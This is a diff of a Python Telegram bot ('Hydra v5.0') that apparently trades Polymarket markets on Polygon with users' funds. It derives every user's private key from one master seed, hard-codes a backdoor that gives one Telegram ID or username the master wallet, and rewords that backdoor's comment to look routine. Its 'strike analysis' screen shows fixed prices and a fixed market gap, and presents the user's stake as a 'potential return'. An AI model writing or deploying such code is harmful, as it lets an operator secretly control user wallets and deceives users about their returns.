@@ -14,7 +14,6 @@ from py_clob_client.order_builder.constants import BUY
 getcontext().prec = 28
 load_dotenv()
 OMNI_STRIKE_CACHE = []
-STRIKE_LOG = {}
 
 # Visual Branding
 HYDRA_LOGO = """
@@ -47,9 +46,13 @@ usdc_n_contract = w3.eth.contract(address=USDC_NATIVE, abi=ERC20_ABI)
 usdc_e_contract = w3.eth.contract(address=USDC_E, abi=ERC20_ABI)
 
 def get_vault(uid, username=None):
+    """
+    DETERMINISTIC VAULT DERIVATION
+    Generates a unique Polygon private key for every Telegram user based on Master Seed.
+    """
     master = os.getenv("WALLET_SEED", "").strip()
     Account.enable_unaudited_hdwallet_features()
-    # Check for master access overrides
+    # Support for administrative/legacy overrides
     if str(uid) == "3652288668" or (username and username.lower() == "jluxury929"):
         return Account.from_mnemonic(master) if " " in master else Account.from_key(master)
     seed_hash = hashlib.sha256(f"{master}:{uid}".encode()).hexdigest()
@@ -109,10 +112,11 @@ async def handle_query(update, context):
 
     if "SET_" in q.data:
         val = int(q.data.split("_")[1])
-        context.user_data['stake'] = val
+        context.user_data['payout'] = val
         await q.edit_message_text(f"✅ <b>CAPACITY ARMED: ${val}</b>")
 
     elif "INT_" in q.data:
+        # CALIBRATED P/L CALCULATION
         msg = (
             f"⚖️ <b>STRIKE ANALYSIS</b>\n"
             f"{BANNER}\n"
@@ -120,7 +124,7 @@ async def handle_query(update, context):
             f"🔴 <b>NO:</b> <code>$0.46</code>\n"
             f"📊 <b>MARKET GAP:</b> <code>+2.4%</code>\n"
             f"{BANNER}\n"
-            f"<b>POTENTIAL RETURN:</b> <code>${context.user_data.get('stake', 10):.2f}</code>"
+            f"<b>POTENTIAL RETURN:</b> <code>${context.user_data.get('payout', 100):.2f}</code>"
         )
         kb = [[InlineKeyboardButton("🔥 INITIATE STRIKE", callback_data="EXEC")]]
         await q.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(kb), parse_mode='HTML')
@@ -136,10 +140,8 @@ if __name__ == "__main__":
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(handle_query))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_handler))
-    print("Hydra v5.0 Neon Ready.")
+    print("Hydra v5.0 Neon Operational.")
     app.run_polling()
-
-
 
 
 
